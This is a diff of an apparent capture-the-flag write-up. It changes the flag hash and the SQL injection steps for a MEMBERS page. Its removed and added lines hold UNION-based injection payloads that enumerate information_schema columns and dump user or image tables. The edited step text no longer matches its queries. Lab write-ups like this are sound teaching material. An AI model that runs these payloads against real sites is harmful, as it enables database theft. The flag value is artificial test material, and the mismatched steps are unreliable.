@@ -3,7 +3,7 @@
 ## Flag
 
 ```
-10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 ```
 
 ## Discovery and Exploitation
@@ -11,14 +11,14 @@
 1. Navigate to the **MEMBERS** page.
 2. To list all tables in the database, insert the following SQL query:
    ```sql
-   1 AND true UNION SELECT table_name, column_name FROM information_schema.columns
+   true UNION SELECT table_name, column_name FROM information_schema.columns
    ```
 3. To list all columns in the `users` table, insert the following SQL query:
    ```sql
-   1 AND true UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
+   true UNION SELECT id, CONCAT(url, comment) FROM list_images
    ```
    > **Note:** The `CONCAT` function is used because there is a restriction that only two columns can be retrieved.
-4. Follow the instructions for the user with ID 5 to obtain the flag.
+4. Follow the instructions for the image with url 5 to obtain the flag.
 
 ## Why it works
 
